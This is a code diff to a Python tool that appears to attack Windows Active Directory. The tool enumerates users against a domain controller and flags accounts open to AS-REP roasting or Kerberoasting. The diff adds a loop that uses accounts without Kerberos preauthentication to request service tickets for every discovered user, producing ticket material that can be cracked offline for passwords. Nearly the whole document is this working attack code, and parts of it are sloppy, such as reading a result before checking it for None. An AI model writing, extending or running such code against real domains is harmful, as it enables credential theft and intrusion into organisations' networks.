@@ -32,6 +32,7 @@ def build_queue(file) -> Queue:
     return q
 
 discovered = []
+no_preauth_users = []
 def enumerate_user(user, domain, dc):
     dc_ip = socket.gethostbyname(dc)
     userclient = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -50,6 +51,7 @@ def enumerate_user(user, domain, dc):
     except Exception as e:
             #print(e)
         print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
+        no_preauth_users.append(user)
         return {'user':user}
         # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         # try:
@@ -88,23 +90,31 @@ def enumerate_user(user, domain, dc):
         #     return 1
 
 
+def get_userTGSs(no_preauth_user, domain, target_users, dc):
+    for user in target_users:
+        try:
+            T = TGS(domain=domain, username=user, dc=dc)
+            T.run(nopreauth_user=no_preauth_user)
+        except Exception as e:
+            print(traceback.print_exc())
+
 
 def get_userTGT(user, domain, dc):
     valid = enumerate_user(user, domain, dc) 
     user = valid['user']
     if valid != None:
-        try:
-            T = TGT(domain=domain, username=user, dc=dc)
-            tgt_data = T.run()
-        except:
-            try:
-                Ts = TGS(domain=domain, username=user, dc=dc)
-                if tgt_data:
-                    no_preauth = user
-                    tgt_data = Ts.run(nopreauth_user=no_preauth)
-                # `error preauth failed`
-            except Exception as e:
-                print(traceback.print_exc())
+        T = TGT(domain=domain, username=user, dc=dc)
+        tgt_data = T.run()
+
+        # except:
+        #     try:
+        #         Ts = TGS(domain=domain, username=user, dc=dc)
+        #         if tgt_data:
+        #             no_preauth = user
+        #             tgt_data = Ts.run(nopreauth_user=no_preauth)
+        #         # `error preauth failed`
+        #     except Exception as e:
+        #         print(traceback.print_exc())
     else:
         tgt_data = None
     return tgt_data
@@ -136,6 +146,8 @@ def run(domain, dc, delay):
             print(e)
         finally:
             t.sleep(delay)
+    for nopreauthuser in no_preauth_users:
+        get_userTGSs(no_preauth_user=nopreauthuser, domain=domain, target_users=discovered, dc=dc)
 
 
 if __name__ == '__main__':
